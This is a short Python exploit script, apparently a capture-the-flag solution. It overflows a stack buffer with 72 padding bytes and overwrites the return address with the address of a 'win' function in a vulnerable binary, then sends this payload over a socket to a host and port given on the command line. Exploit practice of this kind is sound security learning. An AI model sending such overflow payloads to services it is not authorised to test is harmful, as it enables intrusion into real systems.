#!/usr/bin/env

import socket
import argparse
import struct



parser = argparse.ArgumentParser()
parser.add_argument("host", type=str, help="The host name or ip addr to connect to", )
parser.add_argument("port", type=int, help="the ports for the service to connect to",)

args = parser.parse_args()

offset = 72
new_rip = struct.pack("<Q", 0x40123B)  #win function in the vuln binary

payload = b"".join(
	[
		b"A"*offset,#point where A's crash the buffer
		new_rip,
	]
)


payload += b"\n"

with socket.socket() as connection:
	connection.connect((args.host, args.port))
	print(connection.recv(4096).decode("utf-8"))
	connection.send(payload)
	print(connection.recv(4096).decode("utf-8"))
	print(connection.recv(4096).decode("utf-8"))
